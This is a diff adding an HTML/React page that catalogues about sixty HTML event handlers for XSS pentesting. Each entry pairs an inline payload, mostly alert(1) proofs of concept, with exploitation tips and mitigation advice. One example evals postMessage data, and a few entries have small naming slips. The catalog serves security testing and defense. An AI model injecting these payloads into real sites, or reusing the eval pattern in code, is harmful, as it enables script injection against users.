@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML Event Handlers 4 XSS - SudoHopeX</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'accent-teal': '#14b8a6', // Teal 500
+              'code-bg': '#f3f4f6',
+            }
+          }
+        },
+        safelist: [
+            'font-semibold',
+            'bg-teal-50',
+            'text-teal-700',
+            'ring-accent-teal',
+            'bg-green-500',
+            'hover:bg-teal-600',
+            'hover:bg-gray-100', // Added for new button styles
+        ]
+      }
+    </script>
+
+    <style>
+        /* Modern font smoothing for better typography on all devices */
+        body {
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        /* Custom style for code snippets */
+        .code-snippet {
+            font-size: 0.8rem;
+            line-height: 1.25;
+        }
+    </style>
+
+</head>
+<body class="bg-slate-50">
+
+    <div id="root">
+        <div style="padding: 50px; text-align: center; font-family: sans-serif; color: #14b8a6;">
+            Loading XSS Pentesting Catalog...
+        </div>
+    </div>
+
+    <script type="text/babel">
+        const { useState, useMemo, useCallback } = React;
+        const { createRoot } = ReactDOM;
+
+        // --- HANDLERS DATA (V2 with Payloads, Types, and Notes) ---
+        const HANDLERS = [
+            { name: "onclick", type: "Interaction", contexts: ["a","button","div","span","input"], description: "Click on element.", payload_example: "<a onclick='alert(1)'>Click me</a>", notes: "Classic vector. Use target='_blank' on anchors for maximum impact.", mitigation: "Avoid inline handlers; use addEventListener; encode and sanitize user-controlled attributes; use CSP." },
+            { name: "ondblclick", type: "Interaction", contexts: ["div","button","a"], description: "Double click.", payload_example: "<div ondblclick='alert(1)'>Double click me</div>", notes: "Less common, but useful for bypassing single-click restrictions.", mitigation: "Same as onclick." },
+            { name: "oncontextmenu", type: "Interaction", contexts: ["document","div","textarea"], description: "Context menu (usually right-click).", payload_example: "<textarea oncontextmenu='alert(1)'></textarea>", notes: "Requires right-click; often triggers even if element is hidden.", mitigation: "Don't rely on hiding UI for security; sanitize content before insertion." },
+            { name: "onmousedown", type: "Interaction", contexts: ["document","div","button"], description: "Mouse button pressed.", payload_example: "<button onmousedown='alert(1)'>Press</button>", notes: "Triggers on press down, before a click event.", mitigation: "Use safe DOM APIs and avoid constructing HTML from untrusted strings." },
+            { name: "onmouseover", type: "Interaction", contexts: ["div","span","button"], description: "Pointer moved onto an element.", payload_example: "<div onmouseover='alert(1)'>Hover me</div>", notes: "Effective for immediate, non-intrusive exploit delivery.", mitigation: "Prefer external listeners; sanitize HTML." },
+            { name: "onkeydown", type: "Interaction", contexts: ["document","input","textarea"], description: "Key pressed down.", payload_example: "<input onkeydown='alert(1)'>", notes: "Good for self-XSS in input fields.", mitigation: "Validate user input and avoid building HTML from keystrokes." },
+            { name: "onfocus", type: "Focus/Blur", contexts: ["input","textarea","select"], description: "Element receives focus.", payload_example: "<input onfocus='alert(1)' autofocus>", notes: "Use 'autofocus' or open in a new window for auto-execution.", mitigation: "Avoid inline onfocus; encode values in attributes." },
+            { name: "onblur", type: "Focus/Blur", contexts: ["input","textarea","select"], description: "Element loses focus.", payload_example: "<input onfocus='this.blur()' onblur='alert(1)'>", notes: "Often chained with `onfocus` or a delayed script to force unfocus.", mitigation: "Validate and encode values on server." },
+            { name: "oninput", type: "Interaction", contexts: ["input","textarea"], description: "User input (typing/paste).", payload_example: "<input oninput='alert(1)'>", notes: "Can be triggered by simply typing a single character.", mitigation: "Sanitize on paste/insert; prefer textContent over innerHTML." },
+            { name: "onsubmit", type: "Interaction", contexts: ["form"], description: "Form submitted.", payload_example: "<form onsubmit='alert(1)'></form>", notes: "Requires user action on a form element.", mitigation: "Do not put untrusted data into onsubmit attributes; validate server-side." },
+            { name: "onpaste", type: "Interaction", contexts: ["input","textarea"], description: "Paste occurs.", payload_example: "<textarea onpaste='alert(1)'>", notes: "A crucial vector for bypassing input sanitization on paste.", mitigation: "Sanitize pasted HTML/text before insertion; prefer textContent over innerHTML." },
+            { name: "ondragstart", type: "Interaction", contexts: ["img","a","div"], description: "Drag starts.", payload_example: "<img src='x' ondragstart='alert(1)'>", notes: "Triggers on start of dragging the element.", mitigation: "Sanitize attributes that create data URLs or resource references." },
+            { name: "ondrop", type: "Interaction", contexts: ["div","input"], description: "Drop occurs.", payload_example: "<div ondrop='alert(1)' ondragenter='event.preventDefault()' ondragover='event.preventDefault()'>", notes: "Often requires setting `ondragenter` and `ondragover` to prevent default behavior.", mitigation: "Sanitize dropped files/HTML before using." },
+            { name: "onload", type: "Auto-Executing", contexts: ["body","img","iframe","script","link"], description: "Resource or document finished loading.", payload_example: "<body onload='alert(1)'>", notes: "The classic auto-executing vector; works on many tags.", mitigation: "Never inject untrusted markup with <script> or inline onload. Use SRI and CSP." },
+            { name: "onerror", type: "Media/Resource", contexts: ["img","script","iframe"], description: "Resource failed to load.", payload_example: "<img src='x' onerror='alert(1)'>", notes: "The most common and effective vector in `<img>` tags.", mitigation: "Resource errors can reveal state — avoid exposing untrusted markup in error handlers." },
+            { name: "onmessage", type: "Auto-Executing", contexts: ["window","iframe"], description: "postMessage received.", payload_example: "window.addEventListener('message', function(e){ eval(e.data) })", notes: "Highly relevant in modern SPAs and widget integrations. Requires a second window/iframe.", mitigation: "Validate origin and message shape; never inject message data into DOM without encoding." },
+            { name: "onhashchange", type: "Auto-Executing", contexts: ["window"], description: "Fragment identifier changed.", payload_example: "<body onhashchange='alert(1)'>", notes: "Useful for self-XSS where a vulnerable URL fragment is loaded without a page reload.", mitigation: "Treat URL fragments as untrusted input and encode before use." },
+            { name: "onpopstate", type: "Auto-Executing", contexts: ["window"], description: "History entry changed (SPA navigation).", payload_example: "<body onpopstate='alert(1)'>", notes: "Relevant in Single Page Applications (SPAs) that use the History API.", mitigation: "Validate state and avoid inserting untrusted strings." },
+            { name: "onanimationstart", type: "Auto-Executing", contexts: ["any element with CSS animations"], description: "CSS animation started.", payload_example: "<div onanimationstart='alert(1)' style='animation:x'>", notes: "Can be complex to trigger, often requires specific CSS injection.", mitigation: "Avoid embedding untrusted markup in inline styles or animation names." },
+            { name: "onwheel", type: "Interaction", contexts: ["div","window"], description: "Wheel rotated (modern standard).", payload_example: "<div onwheel='alert(1)'>Scroll over me</div>", notes: "Standardized replacement for `onmousewheel`.", mitigation: "Guard DOM updates." },
+            { name: "onscroll", type: "Interaction", contexts: ["document", "div", "iframe"], description: "Content scrolled.", payload_example: "<div style='overflow:scroll;height:10px' onscroll='alert(1)'>", notes: "Requires the element/document to have scrollable content.", mitigation: "Ensure content injected doesn't use untrusted variables in scroll handling." },
+            { name: "onresize", type: "Interaction", contexts: ["window", "body", "div"], description: "Browser window or element resized.", payload_example: "<body onresize='alert(1)'>", notes: "Requires the user to resize the browser window.", mitigation: "Guard DOM writes; avoid inline handlers." },
+            { name: "onfocusin", type: "Focus/Blur", contexts: ["input", "div", "form"], description: "Element receives focus (bubbles, unlike onfocus).", payload_example: "<div onfocusin='alert(1)'>", notes: "Easier to exploit via event delegation than `onfocus`.", mitigation: "Encode all attribute values and use a strict CSP." },
+            { name: "onfocusout", type: "Focus/Blur", contexts: ["input", "div", "form"], description: "Element loses focus (bubbles, unlike onblur).", payload_example: "<div onfocusin='this.focus()' onfocusout='alert(1)'>", notes: "Easier to exploit via event delegation than `onblur`.", mitigation: "Same as onfocusin." },
+            { name: "ontoggle", type: "Interaction", contexts: ["details"], description: "The state of a <details> element changes.", payload_example: "<details open ontoggle='alert(1)'></details>", notes: "Triggers when the `<details>` element opens or closes.", mitigation: "Validate state change content." },
+            { name: "oncuechange", type: "Media/Resource", contexts: ["track", "video", "audio"], description: "The active text track cue changes (for media).", payload_example: "<video><track default oncuechange='alert(1)'></video>", notes: "Rare, but a potential vector in media players.", mitigation: "Ensure track data is encoded." },
+
+            { name: "onkeypress", type: "Legacy", contexts: ["input","textarea"], description: "Character-producing key pressed (legacy).", payload_example: "<input onkeypress='alert(1)'>", notes: "Deprecated in favor of `onkeydown`/`oninput`.", mitigation: "Use input sanitation and server-side validation." },
+            { name: "onmousewheel", type: "Legacy", contexts: ["div","window"], description: "Deprecated wheel event in some browsers.", payload_example: "<div onmousewheel='alert(1)'>", notes: "Use `onwheel` instead.", mitigation: "Use onwheel and guard DOM writes." },
+            { name: "onloadedmetadata", type: "Media/Resource", contexts: ["audio","video","img"], description: "Metadata loaded.", payload_example: "<audio src=x onloadedmetadata='alert(1)'>", notes: "Triggers when media metadata is loaded, even if content hasn't started.", mitigation: "Avoid injecting untrusted metadata into DOM without encoding." },
+
+            { name: "onabort", type: "Media/Resource", contexts: ["audio", "video", "img", "iframe"], description: "Fired when loading of a resource is aborted.", payload_example: "<img src='data:,' onabort='alert(1)'>", notes: "Can be triggered by prematurely stopping a resource load. Effective on resource elements.", mitigation: "Avoid placing untrusted strings into attributes controlling resources." },
+            { name: "oncanplay", type: "Media/Resource", contexts: ["audio", "video"], description: "Fired when the browser can start playing the media.", payload_example: "<video src=x oncanplay='alert(1)' autoplay>", notes: "Useful in media player contexts, often auto-executing if media is supplied.", mitigation: "Validate media sources and metadata before rendering." },
+            { name: "onplay", type: "Media/Resource", contexts: ["audio", "video"], description: "Fired when playback begins.", payload_example: "<video src=x onplay='alert(1)' autoplay>", notes: "Requires the media to start playing, can be chained with `autoplay`.", mitigation: "Validate media sources and user interaction controls." },
+            { name: "onselect", type: "Interaction", contexts: ["input", "textarea"], description: "Fired when some text is selected.", payload_example: "<textarea onselect='alert(1)'>select this text</textarea>", notes: "Triggers only when the user highlights text within the field.", mitigation: "Don't echo raw selected text without encoding." },
+            { name: "onchange", type: "Interaction", contexts: ["input", "select", "textarea"], description: "Value changed and element loses focus (blurs).", payload_example: "<select onchange='alert(1)'><option>1</option></select>", notes: "Critical for select dropdowns and radio buttons, requires blur to fire on inputs.", mitigation: "Prefer programmatic listeners; escape values rendered into DOM." },
+            { name: "onstorage", type: "Auto-Executing", contexts: ["window"], description: "Fired when a storage area (localStorage/sessionStorage) changes.", payload_example: "window.addEventListener('storage', (e) => { alert(1) })", notes: "Requires storage to be modified by another window/tab from the same origin.", mitigation: "Treat storage values as untrusted; encode/validate before use." },
+            { name: "onreadychange", type: "Legacy", contexts: ["document", "xhr"], description: "Fired when the readyState of a resource changes.", payload_example: "<body onreadystatechange='alert(1)'>", notes: "Older event, typically on `document` or `XMLHttpRequest` objects.", mitigation: "Validate AJAX responses before inserting into DOM." },
+            { name: "ontransitionend", type: "Auto-Executing", contexts: ["any element with CSS transitions"], description: "Fired when a CSS transition completes.", payload_example: "<div ontransitionend='alert(1)' style='transition:all 1s'>", notes: "Requires CSS injection to trigger the transition.", mitigation: "Keep dynamic style names safe and encoded." },
+            { name: "onmousemove", type: "Interaction", contexts: ["div","body"], description: "Pointer moved over an element.", payload_example: "<div onmousemove='alert(1)'>Wiggle mouse over me</div>", notes: "Triggers repeatedly for every pixel the mouse moves; very effective for immediate popups.", mitigation: "Guard DOM writes; use Trusted Types." },
+            { name: "onmouseup", type: "Interaction", contexts: ["document","div","button"], description: "Mouse button released.", payload_example: "<button onmouseup='alert(1)'>Release</button>", notes: "Triggers on button release, after `onmousedown`.", mitigation: "Same as onclick." },
+            { name: "onpointermove", type: "Interaction", contexts: ["div","body"], description: "Fired when a pointer (mouse, pen, touch) changes coordinates.", payload_example: "<div onpointermove='alert(1)'>Move pointer here</div>", notes: "Unified handler for touch, mouse, and pen; highly relevant in modern UIs.", mitigation: "General interaction handler mitigations." },
+            { name: "onpointerrawupdate", type: "Interaction/Edge", contexts: ["div","body"], description: "Fired for raw pointer input events (pre-processed).", payload_example: "<div onpointerrawupdate='alert(1)'></div>", notes: "Very new and less common, useful for bypassing filters focused on standard Pointer Events.", mitigation: "Strict CSP and DOM sanitization." },
+            { name: "onsuspend", type: "Media/Resource", contexts: ["audio", "video", "img"], description: "Fired when media loading has been suspended (paused).", payload_example: "<video src='x' onsuspend='alert(1)'></video>", notes: "Often triggered when the browser pauses a failed or incomplete media fetch. Works well with a bad `src`.", mitigation: "Don't inject untrusted data into media element attributes." },
+            { name: "onloadeddata", type: "Media/Resource", contexts: ["audio", "video"], description: "Fired when the current frame data of the media has loaded.", payload_example: "<video src=x onloadeddata='alert(1)' autoplay>", notes: "Triggers before the entire resource is fully buffered, useful for fast execution.", mitigation: "Validate media sources." },
+            { name: "onstalled", type: "Media/Resource", contexts: ["audio", "video", "img"], description: "Fired when the browser is attempting to fetch media data, but the data is not available.", payload_example: "<video src=x onstalled='alert(1)'></video>", notes: "Triggers on a failed or problematic media fetch attempt. Can be used like `onerror` on media tags.", mitigation: "Sanitize media attributes." },
+            { name: "oncanplaythrough", type: "Media/Resource", contexts: ["audio", "video"], description: "Fired when the media can be played to the end without stopping for buffering.", payload_example: "<video src=x oncanplaythrough='alert(1)' autoplay>", notes: "Often auto-executes after `oncanplay` if buffering is fast or the file is small.", mitigation: "Filter/encode attributes." },
+            { name: "onformdata", type: "Interaction", contexts: ["form"], description: "Fired when a form's data is constructed before submission.", payload_example: "<form onformdata='alert(1)'></form>", notes: "Modern form event; triggers right before the data is finalized and sent. Good for intercepting data.", mitigation: "Avoid inline form handlers; prefer `addEventListener`." },
+            { name: "onreset", type: "Interaction", contexts: ["form"], description: "Fired when a form is reset.", payload_example: "<form onreset='alert(1)'><input type=reset></form>", notes: "Requires the user to click a 'reset' button.", mitigation: "Same as onsubmit." },
+            { name: "onbeforeunload", type: "Auto-Executing", contexts: ["window", "body"], description: "Fired just before the window/document is unloaded.", payload_example: "<body onbeforeunload='alert(1)'>", notes: "Triggers on closing the tab or navigating away. Often used to show a prompt, but can execute script first.", mitigation: "Use the non-script return value for prompts; avoid inline code." },
+            { name: "onpageshow", type: "Auto-Executing", contexts: ["window", "body"], description: "Fired when a page is loaded or re-loaded from the browser cache (bfcache).", payload_example: "<body onpageshow='alert(1)'>", notes: "Crucial for exploiting pages that use the back/forward cache.", mitigation: "Use a strict CSP." },
+            { name: "onpause", type: "Media", contexts: ["audio", "video"], description: "Fired when playback is paused.", payload_example: "<video src=x onpause='alert(1)' controls>", notes: "Requires user interaction (clicking the pause button or programmatic pause).", mitigation: "Filter/encode attributes." },
+            { name: "onseeking", type: "Media", contexts: ["audio", "video"], description: "Fired when the user starts seeking (dragging the playback head).", payload_example: "<video src=x onseeking='alert(1)' controls>", notes: "Requires user interaction with the media player controls.", mitigation: "Validate media sources." },
+            { name: "onseeked", type: "Media", contexts: ["audio", "video"], description: "Fired when the user finishes seeking and playback resumes from the new point.", payload_example: "<video src=x onseeked='alert(1)' controls>", notes: "Fires immediately after seeking is complete.", mitigation: "General media tag hardening." },
+            { name: "ontimeupdate", type: "Media", contexts: ["audio", "video"], description: "Fired when the current playback position changes (e.g., every 250ms).", payload_example: "<video src=x ontimeupdate='alert(1)' autoplay>", notes: "Fires repeatedly while media is playing, which can be noisy but guarantees execution if playback starts.", mitigation: "Sanitize all media attributes." },
+            { name: "onvolumechange", type: "Media", contexts: ["audio", "video"], description: "Fired when the volume changes (including mute/unmute).", payload_example: "<video src=x onvolumechange='alert(1)' controls>", notes: "Triggers on user interaction with the volume slider/button.", mitigation: "Filter/encode attributes." },
+            { name: "ondrag", type: "Interaction", contexts: ["div", "img", "a"], description: "An element is being dragged.", payload_example: "<img src=x draggable=true ondrag='alert(1)'>", notes: "Fired repeatedly while the drag operation is in progress (high frequency).", mitigation: "Require `draggable=true` on most elements; filter `ondrag`." },
+            { name: "ondragenter", type: "Interaction", contexts: ["div", "body"], description: "Fired when a dragged element or text enters a valid drop target.", payload_example: "<div ondragenter='alert(1)'>Drop here</div>", notes: "Triggers only if the element is a valid drop target (e.g., has `ondragover`).", mitigation: "Complex drag logic is often overlooked by filters." },
+            { name: "ondragover", type: "Interaction", contexts: ["div", "body"], description: "Fired when a dragged element is moved over a drop target.", payload_example: "<div ondragover='alert(1)'></div>", notes: "Used to define a drop zone. Fired repeatedly while the item is held over the area.", mitigation: "Check all drag-related handlers." },
+        ];
+        // --- END HANDLERS DATA ---
+
+
+        // --- New Sort Options for Filter/Sort Bar ---
+        const SORT_OPTIONS = {
+            NAME_ASC: { key: 'name', label: 'Name (A-Z)', compare: (a, b) => a.name.localeCompare(b.name) },
+            CONTEXT_COUNT: { key: 'contexts', label: 'Context Count', compare: (a, b) => b.contexts.length - a.contexts.length },
+        };
+        const PAYLOAD_TYPES = ["All", "Interaction", "Auto-Executing", "Focus/Blur", "Media/Resource", "Legacy"];
+
+
+        function XssDefenseCatalog() {
+            const contexts = useMemo(() => ["All", ...Array.from(new Set(HANDLERS.flatMap(h => h.contexts))).sort()], []);
+
+            const [query, setQuery] = useState("");
+            const [selectedContext, setSelectedContext] = useState("All");
+            const [selectedType, setSelectedType] = useState("All"); // New Type state
+            const [sortOption, setSortOption] = useState(SORT_OPTIONS.NAME_ASC); // New Sort state
+
+            const [dropdownContextOpen, setDropdownContextOpen] = useState(false);
+            const [dropdownTypeOpen, setDropdownTypeOpen] = useState(false);
+
+            const [copiedHandler, setCopiedHandler] = useState(null);
+            const [copiedSnippet, setCopiedSnippet] = useState(null);
+
+
+            // --- Filtering and Sorting Logic ---
+            const filtered = useMemo(() => {
+                const q = query.trim().toLowerCase();
+
+                // 1. Filter
+                let result = HANDLERS.filter(h => {
+                    const matchQ = q === "" ||
+                           h.name.toLowerCase().includes(q) ||
+                           h.description.toLowerCase().includes(q) ||
+                           h.contexts.some(c => c.toLowerCase().includes(q));
+
+                    const matchC = selectedContext === "All" || h.contexts.includes(selectedContext);
+                    const matchT = selectedType === "All" || h.type === selectedType; // Filter by Type
+
+                    return matchQ && matchC && matchT;
+                });
+
+                // 2. Sort
+                return result.sort(sortOption.compare);
+            }, [query, selectedContext, selectedType, sortOption]);
+
+
+            // --- Copy Functions ---
+            const copyText = async (text) => {
+                if (navigator.clipboard) {
+                    return navigator.clipboard.writeText(text);
+                } else {
+                    const ta = document.createElement('textarea');
+                    ta.value = text;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    ta.remove();
+                    return Promise.resolve();
+                }
+            }
+
+            const copyHandler = useCallback(async (handlerName) => {
+                try {
+                    await copyText(handlerName);
+                    setCopiedHandler(handlerName);
+                } catch (err) {
+                    console.error('Failed to copy handler name: ', err);
+                }
+                setTimeout(() => setCopiedHandler(null), 2000);
+            }, []);
+
+            const copySnippet = useCallback(async (snippet) => {
+                try {
+                    await copyText(snippet);
+                    setCopiedSnippet(snippet);
+                } catch (err) {
+                    console.error('Failed to copy snippet: ', err);
+                }
+                setTimeout(() => setCopiedSnippet(null), 2000);
+            }, []);
+
+
+            // --- HandlerCard Component (UPDATED with New Content/Buttons) ---
+            const HandlerCard = ({ h }) => {
+                const isHandlerCopied = copiedHandler === h.name;
+                const isSnippetCopied = copiedSnippet === h.payload_example;
+
+                return (
+                    <article key={h.name} className="relative rounded-xl bg-white p-6 ring-1 ring-gray-200 shadow-sm transition-all duration-300 hover:ring-2 hover:ring-accent-teal hover:shadow-lg">
+
+                        {/* Handler Name, Type, and Notes */}
+                        <div className="flex items-center justify-between mb-4">
+                            <h3 className="text-xl font-bold font-mono text-gray-900 pr-4">
+                                {h.name}
+                            </h3>
+                            <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${
+                                h.type === 'Interaction' ? 'bg-indigo-100 text-indigo-700' :
+                                h.type === 'Auto-Executing' ? 'bg-red-100 text-red-700' :
+                                h.type === 'Focus/Blur' ? 'bg-yellow-100 text-yellow-700' :
+                                h.type === 'Media/Resource' ? 'bg-blue-100 text-blue-700' :
+                                'bg-gray-100 text-gray-700'
+                            }`}>
+                                {h.type}
+                            </span>
+                        </div>
+
+                        {/* Description */}
+                        <p className="text-gray-600 mb-4 text-sm font-light">{h.description}</p>
+
+                        {/* Payload Example */}
+                        <div className="bg-code-bg p-3 rounded-lg mb-4">
+                            <div className="text-xs font-medium text-gray-500 mb-1 flex items-center">
+                                <span className="mr-2">⚡</span> Payload Example
+                            </div>
+                            <code className="code-snippet font-mono text-gray-800 break-words block whitespace-normal">
+                                {h.payload_example || `<${h.contexts[0] || 'element'} ${h.name}='alert(1)'>`}
+                            </code>
+                            <p className="text-gray-500 mt-2 text-xs italic">{h.notes}</p>
+                        </div>
+
+
+                        {/* Copy Buttons Row (NEW) */}
+                        <div className="flex justify-start gap-3 mb-4">
+                            {/* Copy Handler Name Button (UPDATED ICON) */}
+                            <button
+                                onClick={() => copyHandler(h.name)}
+                                className={`flex items-center space-x-1 px-3 py-1.5 rounded-lg text-xs font-medium transition-all duration-200 border ${
+                                    isHandlerCopied
+                                        ? 'bg-green-500 text-white border-green-600'
+                                        : 'bg-accent-teal text-white hover:bg-teal-600 border-accent-teal'
+                                }`}
+                                title={isHandlerCopied ? "Handler Copied!" : "Copy handler name"}
+                            >
+                                {isHandlerCopied ? (
+                                    <>
+                                        {/* Checkmark Icon */}
+                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2.5} stroke="currentColor" className="w-4 h-4"><path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" /></svg>
+                                        <span>Copied!</span>
+                                    </>
+                                ) : (
+                                    <>
+                                        {/* Preferred Copy Icon */}
+                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="w-4 h-4"><path strokeLinecap="round" strokeLinejoin="round" d="M15.602 4.295A2.25 2.25 0 0013.357 3H7.875A2.25 2.25 0 005.625 5.25v.75A2.25 2.25 0 007.875 8.25h5.482a2.25 2.25 0 002.245-1.947l.001-.001zm1.5 2.25A1.5 1.5 0 0118 8.25v9a1.5 1.5 0 01-1.5 1.5h-9a1.5 1.5 0 01-1.5-1.5v-9a1.5 1.5 0 011.5-1.5h9zM16.5 10.5V1.5H7.5V10.5h9z" /></svg>
+                                        <span>Copy</span>
+                                    </>
+                                )}
+                            </button>
+
+                            {/* Copy Snippet Button (NEW) */}
+                            <button
+                                onClick={() => copySnippet(h.payload_example || `<${h.contexts[0] || 'element'} ${h.name}='alert(1)'>`)}
+                                className={`flex items-center space-x-1 px-3 py-1.5 rounded-lg text-xs font-medium transition-all duration-200 border ${
+                                    isSnippetCopied
+                                        ? 'bg-green-500 text-white border-green-600'
+                                        : 'bg-white text-gray-700 hover:bg-gray-100 border-gray-300'
+                                }`}
+                                title={isSnippetCopied ? "Snippet Copied!" : "Copy full snippet"}
+                            >
+                                {isSnippetCopied ? (
+                                    <>
+                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2.5} stroke="currentColor" className="w-4 h-4"><path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" /></svg>
+                                        <span>Snippet Copied!</span>
+                                    </>
+                                ) : (
+                                    <>
+                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="w-4 h-4"><path strokeLinecap="round" strokeLinejoin="round" d="M17.25 6.75L21.75 12l-4.5 5.25m-1.372-9.613l-4.425-1.683a.75.75 0 00-.573 0L7.5 7.5l-2.25 4.5 2.25 4.5 4.354 1.683a.75.75 0 00.572 0l4.424-1.683" /></svg>
+                                        <span>Copy Snippet</span>
+                                    </>
+                                )}
+                            </button>
+                        </div>
+
+                        {/* Mitigation Section - Minimalist Warning Style */}
+                        <div className="bg-amber-50 border-t border-amber-200 p-3 mb-4 rounded-md">
+                            <div className="font-medium text-amber-800 text-xs flex items-center">
+                                <span className="mr-2">💡</span> Mitigation Advice
+                            </div>
+                            <p className="text-amber-700 mt-1 text-xs leading-snug">{h.mitigation}</p>
+                        </div>
+
+                        {/* Context Pills */}
+                        <div className="mt-4 pt-4 border-t border-gray-100">
+                            <div className="text-xs font-medium text-gray-500 mb-2">Contexts:</div>
+                            <div className="flex flex-wrap gap-2">
+                                {h.contexts.slice(0,6).map(c =>
+                                    <span key={c} className="text-xs px-2 py-0.5 rounded-full bg-teal-50 text-teal-700 font-medium border border-teal-100">
+                                        {c}
+                                    </span>
+                                )}
+                                {h.contexts.length > 6 && (
+                                    <span className="text-xs px-2 py-0.5 rounded-full bg-gray-100 text-gray-500 font-medium">
+                                        + {h.contexts.length - 6} more
+                                    </span>
+                                )}
+                            </div>
+                        </div>
+                    </article>
+                )
+            }
+
+
+            return (
+                <div className="min-h-screen p-4 sm:p-8">
+                    <div className="max-w-7xl mx-auto">
+
+                        {/* Minimalist Header (Adjusted Padding) */}
+                        <header className="py-8 mb-6 border-b border-gray-200">
+                            <h1 className="text-4xl font-extrabold text-gray-900 tracking-tight">
+                                <span className="text-accent-teal mr-2">/</span> XSS Ethical Pentesting Event Handler Catalog
+                            </h1>
+                            <p className="text-gray-500 max-w-4xl mt-3 text-lg">
+                                Comprehensive list of HTML event handlers for Cross-Site Scripting (XSS) pentesting.
+                            </p>
+                        </header>
+
+                        {/* Search + Filter Bar */}
+                        <div className="-mx-4 sm:mx-0 p-4 mb-10 bg-white rounded-xl shadow-lg ring-1 ring-gray-100 transition-all duration-300 top-0 z-10">
+                            <div className="flex flex-col md:flex-row items-stretch md:items-center gap-4">
+
+                                {/* 1. Search Bar */}
+                                <div className="relative flex-1">
+                                    <input aria-label="Search handlers"
+                                        value={query}
+                                        onChange={e => setQuery(e.target.value)}
+                                        className="w-full rounded-lg border border-gray-300 bg-white px-4 py-3 shadow-inner focus:outline-none focus:ring-2 focus:ring-accent-teal focus:border-accent-teal text-base placeholder:text-gray-400"
+                                        placeholder="Search handler, context (e.g., 'input'), or description..." />
+                                </div>
+
+                                {/* 2. Sort Toggle (NEW) */}
+                                <div className="relative w-full md:w-44 flex-shrink-0">
+                                    <button
+                                        onClick={() => setSortOption(sortOption.key === SORT_OPTIONS.NAME_ASC.key ? SORT_OPTIONS.CONTEXT_COUNT : SORT_OPTIONS.NAME_ASC)}
+                                        className="w-full flex items-center justify-between rounded-lg border border-gray-300 bg-white px-4 py-3 text-gray-700 shadow-sm hover:bg-gray-50 transition-colors"
+                                    >
+                                        <span className="text-sm font-medium">Sort By: </span>
+                                        <span className="font-semibold text-accent-teal">{sortOption.label}</span>
+                                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" /></svg>
+                                    </button>
+                                </div>
+
+                                {/* 3. Type Filter Dropdown (NEW) */}
+                                <div className="relative w-full md:w-52 flex-shrink-0">
+                                    <button
+                                        onClick={() => setDropdownTypeOpen(s => !s)}
+                                        className="w-full flex items-center justify-between rounded-lg border border-gray-300 bg-white px-4 py-3 text-gray-700 shadow-sm hover:bg-gray-50 transition-colors"
+                                        aria-expanded={dropdownTypeOpen}>
+                                        <span className="text-sm font-medium">Type: </span>
+                                        <span className="font-semibold text-accent-teal">{selectedType}</span>
+                                        <svg xmlns="http://www.w3.org/2000/svg" className={`h-5 w-5 ml-2 transition-transform ${dropdownTypeOpen ? 'rotate-180 text-accent-teal' : ''}`} fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
+                                    </button>
+
+                                    {dropdownTypeOpen && (
+                                        <div className="absolute z-20 right-0 mt-2 w-full rounded-lg bg-white ring-1 ring-gray-200 shadow-xl max-h-72 overflow-y-auto">
+                                            {PAYLOAD_TYPES.map(t => (
+                                                <div
+                                                    key={t}
+                                                    onClick={() => { setSelectedType(t); setDropdownTypeOpen(false); }}
+                                                    className={`px-4 py-2 cursor-pointer text-sm hover:bg-teal-50 transition-colors ${selectedType === t ? 'font-semibold bg-teal-100 text-teal-700' : 'text-gray-700'}`}>
+                                                    {t}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
+
+                                {/* 4. Context Filter Dropdown */}
+                                <div className="relative w-full md:w-52 flex-shrink-0">
+                                    <button
+                                        onClick={() => setDropdownContextOpen(s => !s)}
+                                        className="w-full flex items-center justify-between rounded-lg border border-gray-300 bg-white px-4 py-3 text-gray-700 shadow-sm hover:bg-gray-50 transition-colors"
+                                        aria-expanded={dropdownContextOpen}>
+                                        <span className="text-sm font-medium">Context: </span>
+                                        <span className="font-semibold text-accent-teal">{selectedContext}</span>
+                                        <svg xmlns="http://www.w3.org/2000/svg" className={`h-5 w-5 ml-2 transition-transform ${dropdownContextOpen ? 'rotate-180 text-accent-teal' : ''}`} fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
+                                    </button>
+
+                                    {dropdownContextOpen && (
+                                        <div className="absolute z-20 right-0 mt-2 w-full rounded-lg bg-white ring-1 ring-gray-200 shadow-xl max-h-72 overflow-y-auto">
+                                            {contexts.map(c => (
+                                                <div
+                                                    key={c}
+                                                    onClick={() => { setSelectedContext(c); setDropdownContextOpen(false); }}
+                                                    className={`px-4 py-2 cursor-pointer text-sm hover:bg-teal-50 transition-colors ${selectedContext === c ? 'font-semibold bg-teal-100 text-teal-700' : 'text-gray-700'}`}>
+                                                    {c}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
